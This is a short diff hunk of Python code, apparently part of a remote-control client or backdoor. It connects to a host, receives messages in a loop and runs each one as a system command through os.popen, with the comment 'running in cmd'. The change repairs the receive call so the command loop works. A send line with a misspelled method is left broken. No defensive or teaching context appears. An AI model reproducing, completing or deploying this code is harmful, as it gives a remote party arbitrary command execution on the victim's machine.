@@ -9,7 +9,7 @@ run = True
 server.connect((host,port))
 
 while run:
-    msg = server.receive(1024)
+    msg = server.recv(1024)
     os.popen(msg.decode('UTF-8'))  #running in cmd
 
     server.send('Client Pnline ...'.enoce('UTF-8'))
